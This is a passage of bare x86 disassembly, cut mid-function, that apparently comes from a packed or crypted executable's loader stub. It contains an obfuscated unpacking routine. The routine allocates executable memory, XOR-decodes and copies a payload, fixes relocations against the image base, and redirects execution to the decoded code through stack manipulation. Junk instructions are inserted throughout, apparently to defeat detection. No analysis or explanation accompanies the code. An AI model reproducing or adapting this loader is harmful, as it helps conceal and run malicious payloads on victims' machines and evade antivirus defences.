  41e4f7:	push   edx
  41e4f8:	call   0x41d600
  41e4fd:	add    esp,0x4
  41e500:	mov    ds:0x4240c4,eax
  41e505:	mov    eax,ds:0x4240c4
  41e50a:	push   eax
  41e50b:	call   0x41e8e0
  41e510:	add    esp,0x4
  41e513:	mov    ds:0x4240ec,eax
  41e518:	mov    ecx,DWORD PTR ds:0x4240c4
  41e51e:	mov    DWORD PTR [ebp-0x34],ecx
  41e521:	mov    DWORD PTR [ebp-0x24],0x64
  41e528:	mov    DWORD PTR [ebp-0x14],0x14
  41e52f:	mov    DWORD PTR [ebp-0x2c],0x0
  41e536:	mov    DWORD PTR [ebp-0x18],0x0
  41e53d:	mov    DWORD PTR [ebp-0x20],0x1
  41e544:	mov    DWORD PTR [ebp-0xc],0x0
  41e54b:	mov    edx,DWORD PTR [ebp-0x2c]
  41e54e:	cmp    edx,DWORD PTR ds:0x4240c4
  41e554:	jae    0x41e5a8
  41e556:	mov    eax,DWORD PTR [ebp-0x34]
  41e559:	push   eax
  41e55a:	mov    ecx,DWORD PTR [ebp-0x24]
  41e55d:	push   ecx
  41e55e:	call   0x41d670
  41e563:	add    esp,0x8
  41e566:	mov    DWORD PTR [ebp-0x38],eax
  41e569:	mov    edx,DWORD PTR [ebp-0x38]
  41e56c:	push   edx
  41e56d:	mov    eax,ds:0x4240cc
  41e572:	add    eax,DWORD PTR [ebp-0x18]
  41e575:	push   eax
  41e576:	mov    ecx,DWORD PTR ds:0x4240ec
  41e57c:	add    ecx,DWORD PTR [ebp-0x2c]
  41e57f:	push   ecx
  41e580:	call   0x41e700
  41e585:	add    esp,0xc
  41e588:	mov    edx,DWORD PTR [ebp-0x14]
  41e58b:	add    edx,DWORD PTR [ebp-0x24]
  41e58e:	add    edx,DWORD PTR [ebp-0x18]
  41e591:	mov    DWORD PTR [ebp-0x18],edx
  41e594:	mov    eax,DWORD PTR [ebp-0x2c]
  41e597:	add    eax,DWORD PTR [ebp-0x24]
  41e59a:	mov    DWORD PTR [ebp-0x2c],eax
  41e59d:	mov    ecx,DWORD PTR [ebp-0x34]
  41e5a0:	sub    ecx,DWORD PTR [ebp-0x38]
  41e5a3:	mov    DWORD PTR [ebp-0x34],ecx
  41e5a6:	jmp    0x41e54b
  41e5a8:	mov    edx,DWORD PTR ds:0x4240c4
  41e5ae:	push   edx
  41e5af:	mov    eax,ds:0x4240ec
  41e5b4:	push   eax
  41e5b5:	call   0x41e7b0
  41e5ba:	add    esp,0x8
  41e5bd:	mov    DWORD PTR [ebp-0x18],0x0
  41e5c4:	mov    DWORD PTR [ebp-0x70],0x0
  41e5cb:	mov    ecx,DWORD PTR ds:0x4240c4
  41e5d1:	push   ecx
  41e5d2:	push   0x0
  41e5d4:	mov    edx,DWORD PTR ds:0x4240c8
  41e5da:	push   edx
  41e5db:	call   0x41d5b0
  41e5e0:	add    esp,0xc
  41e5e3:	mov    eax,ds:0x4240c4
  41e5e8:	mov    DWORD PTR [ebp-0x78],eax
  41e5eb:	mov    ecx,DWORD PTR [ebp-0x70]
  41e5ee:	cmp    ecx,DWORD PTR ds:0x4240c4
  41e5f4:	jae    0x41e648
  41e5f6:	mov    edx,DWORD PTR [ebp-0x78]
  41e5f9:	push   edx
  41e5fa:	mov    eax,DWORD PTR [ebp-0x24]
  41e5fd:	push   eax
  41e5fe:	call   0x41d670
  41e603:	add    esp,0x8
  41e606:	mov    DWORD PTR [ebp-0x7c],eax
  41e609:	mov    ecx,DWORD PTR [ebp-0x7c]
  41e60c:	push   ecx
  41e60d:	mov    edx,DWORD PTR ds:0x4240cc
  41e613:	add    edx,DWORD PTR [ebp-0x18]
  41e616:	push   edx
  41e617:	mov    eax,ds:0x4240c8
  41e61c:	add    eax,DWORD PTR [ebp-0x70]
  41e61f:	push   eax
  41e620:	call   0x41e700
  41e625:	add    esp,0xc
  41e628:	mov    ecx,DWORD PTR [ebp-0x14]
  41e62b:	add    ecx,DWORD PTR [ebp-0x24]
  41e62e:	add    ecx,DWORD PTR [ebp-0x18]
  41e631:	mov    DWORD PTR [ebp-0x18],ecx
  41e634:	mov    edx,DWORD PTR [ebp-0x70]
  41e637:	add    edx,DWORD PTR [ebp-0x24]
  41e63a:	mov    DWORD PTR [ebp-0x70],edx
  41e63d:	mov    eax,DWORD PTR [ebp-0x78]
  41e640:	sub    eax,DWORD PTR [ebp-0x7c]
  41e643:	mov    DWORD PTR [ebp-0x78],eax
  41e646:	jmp    0x41e5eb
  41e648:	mov    ecx,DWORD PTR ds:0x4240c4
  41e64e:	push   ecx
  41e64f:	mov    edx,DWORD PTR ds:0x4240c8
  41e655:	push   edx
  41e656:	call   0x41e7b0
  41e65b:	add    esp,0x8
  41e65e:	mov    DWORD PTR [ebp-0x28],0x41dbd0
  41e665:	mov    eax,ds:0x4240ec
  41e66a:	mov    ecx,DWORD PTR ds:0x4240c8
  41e670:	mov    DWORD PTR [eax],ecx
  41e672:	push   0x19000
  41e677:	call   0x41e8e0
  41e67c:	add    esp,0x4
  41e67f:	mov    ds:0x4240f0,eax
  41e684:	mov    edx,DWORD PTR ds:0x4240f0
  41e68a:	add    edx,0x200
  41e690:	mov    DWORD PTR ds:0x4240f4,edx
  41e696:	push   0x17600
  41e69b:	mov    eax,ds:0x4240ec
  41e6a0:	push   eax
  41e6a1:	mov    ecx,DWORD PTR ds:0x4240f4
  41e6a7:	push   ecx
  41e6a8:	call   0x41e700
  41e6ad:	add    esp,0xc
  41e6b0:	mov    edx,DWORD PTR ds:0x4240f0
  41e6b6:	add    edx,0x174c0
  41e6bc:	mov    DWORD PTR ds:0x4240e4,edx
  41e6c2:	mov    ecx,ecx
  41e6c4:	mov    ecx,ecx
  41e6c6:	mov    ecx,ecx
  41e6c8:	mov    ecx,ecx
  41e6ca:	mov    ecx,ecx
  41e6cc:	mov    ecx,ecx
  41e6ce:	mov    ecx,ecx
  41e6d0:	push   0xde9b
  41e6d5:	mov    eax,DWORD PTR [ebp-0x28]
  41e6d8:	mov    ecx,ecx
  41e6da:	mov    ecx,ecx
  41e6dc:	mov    ecx,esp
  41e6de:	push   edx
  41e6df:	mov    edx,ecx
  41e6e1:	sub    edx,0x26
  41e6e4:	mov    ecx,edx
  41e6e6:	pop    edx
  41e6e7:	add    ecx,0x22
  41e6ea:	mov    ecx,ecx
  41e6ec:	mov    DWORD PTR [ecx+0x4],0x0
  41e6f3:	mov    ecx,ecx
  41e6f5:	add    DWORD PTR [ecx+0x4],eax
  41e6f8:	ret    
  41e6f9:	xor    eax,eax
  41e6fb:	mov    esp,ebp
  41e6fd:	pop    ebp
  41e6fe:	ret    
  41e6ff:	int3   
  41e700:	push   ebp
  41e701:	mov    ebp,esp
  41e703:	sub    esp,0x8
  41e706:	mov    DWORD PTR [ebp-0x4],0x0
  41e70d:	jmp    0x41e718
  41e70f:	mov    eax,DWORD PTR [ebp-0x4]
  41e712:	add    eax,0x1
  41e715:	mov    DWORD PTR [ebp-0x4],eax
  41e718:	mov    ecx,DWORD PTR [ebp-0x4]
  41e71b:	cmp    ecx,DWORD PTR [ebp+0x10]
  41e71e:	jge    0x41e77f
  41e720:	mov    DWORD PTR [ebp-0x8],0x889bb
  41e727:	mov    DWORD PTR [ebp-0x8],0x889bb
  41e72e:	mov    DWORD PTR [ebp-0x8],0x889bb
  41e735:	mov    DWORD PTR [ebp-0x8],0x889bb
  41e73c:	mov    DWORD PTR [ebp-0x8],0x889bb
  41e743:	mov    DWORD PTR [ebp-0x8],0x889bb
  41e74a:	mov    DWORD PTR [ebp-0x8],0x889bb
  41e751:	mov    DWORD PTR [ebp-0x8],0x889bb
  41e758:	mov    DWORD PTR [ebp-0x8],0x889bb
  41e75f:	mov    DWORD PTR [ebp-0x8],0x889bb
  41e766:	mov    DWORD PTR [ebp-0x8],0x889bb
  41e76d:	mov    edx,DWORD PTR [ebp+0x8]
  41e770:	add    edx,DWORD PTR [ebp-0x4]
  41e773:	mov    eax,DWORD PTR [ebp+0xc]
  41e776:	add    eax,DWORD PTR [ebp-0x4]
  41e779:	mov    cl,BYTE PTR [eax]
  41e77b:	mov    BYTE PTR [edx],cl
  41e77d:	jmp    0x41e70f
  41e77f:	mov    edx,DWORD PTR [ebp+0x8]
  41e782:	cmp    edx,DWORD PTR ds:0x4240f4
  41e788:	jne    0x41e7ab
  41e78a:	mov    eax,ds:0x4240f0
  41e78f:	sub    eax,0x400000
  41e794:	push   eax
  41e795:	mov    ecx,DWORD PTR ds:0x4240f0
  41e79b:	push   ecx
  41e79c:	mov    edx,DWORD PTR ds:0x4240c8
  41e7a2:	push   edx
  41e7a3:	call   0x41dc80
  41e7a8:	add    esp,0xc
  41e7ab:	mov    esp,ebp
  41e7ad:	pop    ebp
  41e7ae:	ret    
  41e7af:	int3   
  41e7b0:	push   ebp
  41e7b1:	mov    ebp,esp
  41e7b3:	sub    esp,0x10
  41e7b6:	mov    DWORD PTR [ebp-0x4],0x0
  41e7bd:	jmp    0x41e7c8
  41e7bf:	mov    eax,DWORD PTR [ebp-0x4]
  41e7c2:	add    eax,0x4
  41e7c5:	mov    DWORD PTR [ebp-0x4],eax
  41e7c8:	mov    ecx,DWORD PTR [ebp-0x4]
  41e7cb:	cmp    ecx,DWORD PTR [ebp+0xc]
  41e7ce:	jae    0x41e86b
  41e7d4:	mov    DWORD PTR [ebp-0x8],0xc842
  41e7db:	mov    DWORD PTR [ebp-0x8],0xc842
  41e7e2:	mov    DWORD PTR [ebp-0x8],0xc842
  41e7e9:	mov    edx,DWORD PTR [ebp-0x4]
  41e7ec:	add    edx,0x8948c
  41e7f2:	mov    DWORD PTR ds:0x4240f8,edx
  41e7f8:	mov    DWORD PTR [ebp-0x8],0xc842
  41e7ff:	mov    eax,DWORD PTR [ebp+0x8]
  41e802:	add    eax,DWORD PTR [ebp-0x4]
  41e805:	mov    DWORD PTR [ebp-0x10],eax
  41e808:	mov    DWORD PTR [ebp-0x8],0xc842
  41e80f:	mov    DWORD PTR [ebp-0x8],0xc842
  41e816:	mov    DWORD PTR [ebp-0x8],0xc842
  41e81d:	mov    ecx,DWORD PTR [ebp-0x10]
  41e820:	mov    DWORD PTR [ebp-0xc],ecx
  41e823:	mov    edx,DWORD PTR ds:0x4240f8
  41e829:	mov    DWORD PTR [ebp-0x8],edx
  41e82c:	mov    DWORD PTR [ebp-0x8],0xc842
  41e833:	mov    eax,DWORD PTR [ebp-0x10]
  41e836:	mov    ecx,DWORD PTR [eax]
  41e838:	add    ecx,DWORD PTR [ebp-0x4]
  41e83b:	mov    edx,DWORD PTR [ebp-0x10]
  41e83e:	mov    DWORD PTR [edx],ecx
  41e840:	mov    eax,DWORD PTR [ebp-0xc]
  41e843:	mov    ecx,DWORD PTR [eax]
  41e845:	mov    DWORD PTR [ebp-0x8],ecx
  41e848:	mov    edx,DWORD PTR ds:0x4240f8
  41e84e:	push   edx
  41e84f:	mov    eax,DWORD PTR [ebp-0x8]
  41e852:	push   eax
  41e853:	call   0x41e870
  41e858:	add    esp,0x8
  41e85b:	mov    DWORD PTR [ebp-0x8],eax
  41e85e:	mov    ecx,DWORD PTR [ebp-0xc]
  41e861:	mov    edx,DWORD PTR [ebp-0x8]
  41e864:	mov    DWORD PTR [ecx],edx
  41e866:	jmp    0x41e7bf
  41e86b:	mov    esp,ebp
  41e86d:	pop    ebp
  41e86e:	ret    
  41e86f:	int3   
  41e870:	push   ebp
  41e871:	mov    ebp,esp
  41e873:	sub    esp,0x14
  41e876:	mov    DWORD PTR [ebp-0x8],0xdd7
  41e87d:	mov    DWORD PTR [ebp-0x8],0xdd7
  41e884:	mov    DWORD PTR [ebp-0x8],0xdd7
  41e88b:	mov    eax,DWORD PTR [ebp+0x8]
  41e88e:	xor    eax,DWORD PTR [ebp+0xc]
  41e891:	mov    DWORD PTR [ebp-0x10],eax
  41e894:	mov    DWORD PTR [ebp-0x8],0xdd7
  41e89b:	mov    DWORD PTR [ebp-0x8],0xdd7
  41e8a2:	mov    ecx,DWORD PTR [ebp+0xc]
  41e8a5:	mov    DWORD PTR [ebp-0x4],ecx
  41e8a8:	mov    DWORD PTR [ebp-0x8],0xdd7
  41e8af:	mov    DWORD PTR [ebp-0x8],0xdd7
  41e8b6:	mov    edx,DWORD PTR [ebp+0x8]
  41e8b9:	mov    DWORD PTR [ebp-0xc],edx
  41e8bc:	mov    DWORD PTR [ebp-0x8],0xdd7
  41e8c3:	mov    DWORD PTR [ebp-0x8],0xdd7
  41e8ca:	mov    eax,DWORD PTR [ebp-0x10]
  41e8cd:	mov    DWORD PTR [ebp-0x14],eax
  41e8d0:	mov    eax,DWORD PTR [ebp-0x14]
  41e8d3:	mov    esp,ebp
  41e8d5:	pop    ebp
  41e8d6:	ret    
  41e8d7:	int3   
  41e8d8:	int3   
  41e8d9:	int3   
  41e8da:	int3   
  41e8db:	int3   
  41e8dc:	int3   
  41e8dd:	int3   
  41e8de:	int3   
  41e8df:	int3   
  41e8e0:	push   ebp
  41e8e1:	mov    ebp,esp
  41e8e3:	sub    esp,0x238
  41e8e9:	mov    DWORD PTR [ebp-0x1c],0x307c
  41e8f0:	mov    DWORD PTR [ebp-0x238],0x3000
  41e8fa:	mov    DWORD PTR [ebp-0x18],0x40
  41e901:	mov    DWORD PTR [ebp-0x22c],0x0
  41e90b:	mov    DWORD PTR [ebp-0x230],0x0
  41e915:	mov    DWORD PTR [ebp-0x14],0x0
  41e91c:	lea    eax,[ebp-0x14]
  41e91f:	push   eax
  41e920:	push   0x0
  41e922:	call   DWORD PTR ds:0x423450
  41e928:	cmp    DWORD PTR [ebp-0x14],0x0
  41e92c:	jne    0x41e932
  41e92e:	xor    eax,eax
  41e930:	jmp    0x41e94e
  41e932:	mov    ecx,DWORD PTR [ebp-0x18]
  41e935:	push   ecx
  41e936:	mov    edx,DWORD PTR [ebp-0x238]
  41e93c:	push   edx
  41e93d:	mov    eax,DWORD PTR [ebp+0x8]
  41e940:	push   eax
  41e941:	mov    ecx,DWORD PTR [ebp-0x22c]
  41e947:	push   ecx
  41e948:	call   DWORD PTR ds:0x423458
  41e94e:	mov    esp,ebp
  41e950:	pop    ebp
  41e951:	ret    
  41e952:	int3   
  41e953:	int3   
  41e954:	int3   
  41e955:	int3   
  41e956:	int3   
  41e957:	int3   
  41e958:	int3   
  41e959:	int3   
  41e95a:	int3   
  41e95b:	int3   
  41e95c:	int3   
  41e95d:	int3   
  41e95e:	int3   
  41e95f:	int3   
  41e960:	push   ebp
  41e961:	mov    ebp,esp
  41e963:	sub    esp,0xc
  41e966:	mov    DWORD PTR [ebp-0xc],0x889bb
  41e96d:	mov    DWORD PTR [ebp-0xc],0x889bb
  41e974:	mov    DWORD PTR [ebp-0xc],0x889bb
  41e97b:	mov    DWORD PTR [ebp-0xc],0x889bb
  41e982:	mov    DWORD PTR [ebp-0xc],0x889bb
  41e989:	mov    DWORD PTR [ebp-0xc],0x889bb
  41e990:	mov    DWORD PTR [ebp-0xc],0x889bb
  41e997:	mov    DWORD PTR [ebp-0xc],0x889bb
  41e99e:	mov    DWORD PTR [ebp-0xc],0x889bb
  41e9a5:	mov    DWORD PTR [ebp-0xc],0x889bb
  41e9ac:	mov    DWORD PTR [ebp-0xc],0x889bb
  41e9b3:	mov    DWORD PTR [ebp-0x4],0x0
  41e9ba:	jmp    0x41e9c5
  41e9bc:	mov    eax,DWORD PTR [ebp-0x4]
  41e9bf:	add    eax,0x1
  41e9c2:	mov    DWORD PTR [ebp-0x4],eax
  41e9c5:	mov    ecx,DWORD PTR ds:0x4240dc
  41e9cb:	shr    ecx,1
  41e9cd:	cmp    DWORD PTR [ebp-0x4],ecx
  41e9d0:	jae    0x41eabe
  41e9d6:	mov    DWORD PTR [ebp-0xc],0x889bb
  41e9dd:	mov    DWORD PTR [ebp-0xc],0x889bb
  41e9e4:	mov    DWORD PTR [ebp-0xc],0x889bb
  41e9eb:	mov    DWORD PTR [ebp-0xc],0x889bb
  41e9f2:	mov    DWORD PTR [ebp-0xc],0x889bb
  41e9f9:	mov    DWORD PTR [ebp-0xc],0x889bb
  41ea00:	mov    DWORD PTR [ebp-0xc],0x889bb
  41ea07:	mov    DWORD PTR [ebp-0xc],0x889bb
  41ea0e:	mov    DWORD PTR [ebp-0xc],0x889bb
  41ea15:	mov    edx,DWORD PTR [ebp-0x4]
  41ea18:	push   edx
  41ea19:	mov    eax,ds:0x4240e8
  41ea1e:	push   eax
  41ea1f:	call   0x41d610
  41ea24:	add    esp,0x8
  41ea27:	sar    eax,0xc
  41ea2a:	cmp    eax,0x3
  41ea2d:	jne    0x41eab9
  41ea33:	mov    DWORD PTR [ebp-0xc],0x889bb
  41ea3a:	mov    DWORD PTR [ebp-0xc],0x889bb
  41ea41:	mov    DWORD PTR [ebp-0xc],0x889bb
  41ea48:	mov    DWORD PTR [ebp-0xc],0x889bb
  41ea4f:	mov    DWORD PTR [ebp-0xc],0x889bb
  41ea56:	mov    DWORD PTR [ebp-0xc],0x889bb
  41ea5d:	mov    DWORD PTR [ebp-0xc],0x889bb
  41ea64:	mov    DWORD PTR [ebp-0xc],0x889bb
  41ea6b:	mov    DWORD PTR [ebp-0xc],0x889bb
  41ea72:	mov    ecx,DWORD PTR [ebp-0x4]
  41ea75:	push   ecx
  41ea76:	mov    edx,DWORD PTR ds:0x4240e8
  41ea7c:	push   edx
  41ea7d:	call   0x41d610
  41ea82:	add    esp,0x8
  41ea85:	and    eax,0xfff
  41ea8a:	add    eax,0xa124
  41ea8f:	mov    DWORD PTR [ebp-0x8],eax
  41ea92:	mov    eax,DWORD PTR [ebp+0x8]
  41ea95:	mov    ecx,DWORD PTR [ebp+0xc]
  41ea98:	add    ecx,DWORD PTR [eax]
  41ea9a:	mov    edx,DWORD PTR [ebp-0x8]
  41ea9d:	mov    eax,DWORD PTR [ecx+edx*1-0xa124]
  41eaa4:	add    eax,DWORD PTR [ebp+0x10]
  41eaa7:	mov    ecx,DWORD PTR [ebp+0x8]
  41eaaa:	mov    edx,DWORD PTR [ebp+0xc]
  41eaad:	add    edx,DWORD PTR [ecx]
  41eaaf:	mov    ecx,DWORD PTR [ebp-0x8]
  41eab2:	mov    DWORD PTR [edx+ecx*1-0xa124],eax
  41eab9:	jmp    0x41e9bc
  41eabe:	mov    esp,ebp
  41eac0:	pop    ebp
  41eac1:	ret    
  41eac2:	jmp    DWORD PTR ds:0x423374
  41eac8:	jmp    DWORD PTR ds:0x423378
  41eace:	jmp    DWORD PTR ds:0x42337c
  41ead4:	jmp    DWORD PTR ds:0x423380
  41eada:	jmp    DWORD PTR ds:0x423384
  41eae0:	jmp    DWORD PTR ds:0x423388
  41eae6:	jmp    DWORD PTR ds:0x42338c
  41eaec:	jmp    DWORD PTR ds:0x423390
  41eaf2:	jmp    DWORD PTR ds:0x423394
  41eaf8:	jmp    DWORD PTR ds:0x423398
  41eafe:	jmp    DWORD PTR ds:0x42339c
  41eb04:	jmp    DWORD PTR ds:0x4233a0
  41eb0a:	jmp    DWORD PTR ds:0x4233a4
  41eb10:	jmp    DWORD PTR ds:0x4233a8
  41eb16:	jmp    DWORD PTR ds:0x4233ac
  41eb1c:	jmp    DWORD PTR ds:0x4233b0
  41eb22:	jmp    DWORD PTR ds:0x4233b4
  41eb28:	jmp    DWORD PTR ds:0x4233b8
  41eb2e:	jmp    DWORD PTR ds:0x4233bc
  41eb34:	jmp    DWORD PTR ds:0x4233c0
  41eb3a:	jmp    DWORD PTR ds:0x4233c4
  41eb40:	jmp    DWORD PTR ds:0x4233c8
  41eb46:	jmp    DWORD PTR ds:0x4233cc
  41eb4c:	jmp    DWORD PTR ds:0x4233d0
  41eb52:	jmp    DWORD PTR ds:0x4233d4
  41eb58:	jmp    DWORD PTR ds:0x4233d8
  41eb5e:	jmp    DWORD PTR ds:0x4233dc
  41eb64:	jmp    DWORD PTR ds:0x4233e0
  41eb6a:	jmp    DWORD PTR ds:0x4233e4
  41eb70:	jmp    DWORD PTR ds:0x4233e8
  41eb76:	jmp    DWORD PTR ds:0x4233ec
  41eb7c:	jmp    DWORD PTR ds:0x4233f0
  41eb82:	jmp    DWORD PTR ds:0x4233f4
  41eb88:	jmp    DWORD PTR ds:0x4233f8
  41eb8e:	jmp    DWORD PTR ds:0x4233fc
  41eb94:	jmp    DWORD PTR ds:0x423400
  41eb9a:	jmp    DWORD PTR ds:0x423404
  41eba0:	jmp    DWORD PTR ds:0x423408
  41eba6:	jmp    DWORD PTR ds:0x42340c
  41ebac:	jmp    DWORD PTR ds:0x423410
  41ebb2:	jmp    DWORD PTR ds:0x423414
  41ebb8:	jmp    DWORD PTR ds:0x423418
  41ebbe:	jmp    DWORD PTR ds:0x42341c
  41ebc4:	jmp    DWORD PTR ds:0x423420
  41ebca:	jmp    DWORD PTR ds:0x423424
  41ebd0:	jmp    DWORD PTR ds:0x423428
  41ebd6:	jmp    DWORD PTR ds:0x42342c
  41ebdc:	jmp    DWORD PTR ds:0x423430
  41ebe2:	jmp    DWORD PTR ds:0x423434
  41ebe8:	jmp    DWORD PTR ds:0x423438
  41ebee:	jmp    DWORD PTR ds:0x42343c
  41ebf4:	jmp    DWORD PTR ds:0x423440
  41ebfa:	jmp    DWORD PTR ds:0x423444
  41ec00:	jmp    DWORD PTR ds:0x423448
  41ec06:	jmp    DWORD PTR ds:0x42344c
  41ec0c:	jmp    DWORD PTR ds:0x423450
  41ec12:	jmp    DWORD PTR ds:0x423454
  41ec18:	jmp    DWORD PTR ds:0x423458
  41ec1e:	jmp    DWORD PTR ds:0x423460
  41ec24:	jmp    DWORD PTR ds:0x423464
  41ec2a:	jmp    DWORD PTR ds:0x423468
  41ec30:	jmp    DWORD PTR ds:0x42346c
  41ec36:	jmp    DWORD PTR ds:0x423470
  41ec3c:	jmp    DWORD PTR ds:0x423474
  41ec42:	jmp    DWORD PTR ds:0x423478
  41ec48:	jmp    DWORD PTR ds:0x42347c
  41ec4e:	jmp    DWORD PTR ds:0x423480
  41ec54:	jmp    DWORD PTR ds:0x423484
  41ec5a:	jmp    DWORD PTR ds:0x423488
  41ec60:	jmp    DWORD PTR ds:0x42348c
  41ec66:	jmp    DWORD PTR ds:0x423490
  41ec6c:	jmp    DWORD PTR ds:0x423494
  41ec72:	jmp    DWORD PTR ds:0x423498
  41ec78:	jmp    DWORD PTR ds:0x42349c
  41ec7e:	jmp    DWORD PTR ds:0x4234a0
  41ec84:	jmp    DWORD PTR ds:0x4234a4
  41ec8a:	jmp    DWORD PTR ds:0x4234a8
  41ec90:	jmp    DWORD PTR ds:0x4234ac
  41ec96:	jmp    DWORD PTR ds:0x4234b0
  41ec9c:	jmp    DWORD PTR ds:0x4234b4
  41eca2:	jmp    DWORD PTR ds:0x4234b8
  41eca8:	jmp    DWORD PTR ds:0x4234bc
  41ecae:	jmp    DWORD PTR ds:0x4234c0
  41ecb4:	jmp    DWORD PTR ds:0x4234c4
  41ecba:	jmp    DWORD PTR ds:0x4234c8
  41ecc0:	jmp    DWORD PTR ds:0x4234cc
  41ecc6:	jmp    DWORD PTR ds:0x4234d0
  41eccc:	jmp    DWORD PTR ds:0x4234d4
  41ecd2:	jmp    DWORD PTR ds:0x4234d8
  41ecd8:	jmp    DWORD PTR ds:0x4234dc
  41ecde:	jmp    DWORD PTR ds:0x4234e0
  41ece4:	jmp    DWORD PTR ds:0x4234e4
  41ecea:	jmp    DWORD PTR ds:0x4234e8
  41ecf0:	jmp    DWORD PTR ds:0x4234ec
  41ecf6:	jmp    DWORD PTR ds:0x4234f0
  41ecfc:	jmp    DWORD PTR ds:0x4234f4
  41ed02:	jmp    DWORD PTR ds:0x4234f8
  41ed08:	jmp    DWORD PTR ds:0x4234fc
  41ed0e:	jmp    DWORD PTR ds:0x423500
  41ed14:	jmp    DWORD PTR ds:0x423504
  41ed1a:	jmp    DWORD PTR ds:0x423508
  41ed20:	jmp    DWORD PTR ds:0x42350c
  41ed26:	jmp    DWORD PTR ds:0x423510
  41ed2c:	jmp    DWORD PTR ds:0x423514
  41ed32:	jmp    DWORD PTR ds:0x423518
  41ed38:	jmp    DWORD PTR ds:0x42351c
  41ed3e:	jmp    DWORD PTR ds:0x423520
  41ed44:	jmp    DWORD PTR ds:0x423524
  41ed4a:	jmp    DWORD PTR ds:0x423528
  41ed50:	jmp    DWORD PTR ds:0x42352c
  41ed56:	jmp    DWORD PTR ds:0x423530
  41ed5c:	jmp    DWORD PTR ds:0x423534
  41ed62:	jmp    DWORD PTR ds:0x423538
  41ed68:	jmp    DWORD PTR ds:0x42353c
  41ed6e:	jmp    DWORD PTR ds:0x423540
  41ed74:	jmp    DWORD PTR ds:0x423544
  41ed7a:	jmp    DWORD PTR ds:0x423548
  41ed80:	jmp    DWORD PTR ds:0x42354c
  41ed86:	jmp    DWORD PTR ds:0x423550
  41ed8c:	jmp    DWORD PTR ds:0x423554
  41ed92:	jmp    DWORD PTR ds:0x423558
  41ed98:	jmp    DWORD PTR ds:0x42355c
  41ed9e:	jmp    DWORD PTR ds:0x423560
  41eda4:	jmp    DWORD PTR ds:0x423564
  41edaa:	jmp    DWORD PTR ds:0x423568
  41edb0:	jmp    DWORD PTR ds:0x42356c
  41edb6:	jmp    DWORD PTR ds:0x423570
  41edbc:	jmp    DWORD PTR ds:0x423574
  41edc2:	jmp    DWORD PTR ds:0x423578
  41edc8:	jmp    DWORD PTR ds:0x42357c
  41edce:	jmp    DWORD PTR ds:0x423580
  41edd4:	jmp    DWORD PTR ds:0x423584
  41edda:	jmp    DWORD PTR ds:0x423588
  41ede0:	jmp    DWORD PTR ds:0x42358c
  41ede6:	jmp    DWORD PTR ds:0x423590
  41edec:	jmp    DWORD PTR ds:0x423594
  41edf2:	jmp    DWORD PTR ds:0x42359c
  41edf8:	jmp    DWORD PTR ds:0x4235a0
  41edfe:	jmp    DWORD PTR ds:0x4235a4
  41ee04:	jmp    DWORD PTR ds:0x4235a8
  41ee0a:	jmp    DWORD PTR ds:0x4235ac
  41ee10:	jmp    DWORD PTR ds:0x4235b0
  41ee16:	jmp    DWORD PTR ds:0x4235b8
  41ee1c:	jmp    DWORD PTR ds:0x4235bc
  41ee22:	jmp    DWORD PTR ds:0x4235c4
  41ee28:	jmp    DWORD PTR ds:0x4235c8
  41ee2e:	jmp    DWORD PTR ds:0x4235cc
  41ee34:	jmp    DWORD PTR ds:0x4235d0
  41ee3a:	jmp    DWORD PTR ds:0x4235d4
  41ee40:	jmp    DWORD PTR ds:0x4235d8
  41ee46:	jmp    DWORD PTR ds:0x4235dc
  41ee4c:	jmp    DWORD PTR ds:0x4235e4
  41ee52:	jmp    DWORD PTR ds:0x4235ec
  41ee58:	jmp    DWORD PTR ds:0x4235f0
